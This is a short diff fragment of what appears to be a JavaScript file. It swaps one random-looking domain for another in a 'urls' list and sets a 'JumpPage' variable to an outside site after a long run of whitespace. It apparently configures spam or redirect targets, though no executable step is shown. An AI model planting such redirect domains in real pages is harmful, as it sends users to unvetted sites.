@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'ukdgpgedw.cc',
+	'vhkeceubm.com',
 ];
                                                                                                                   
 var JumpPage="https://18hdm.net";
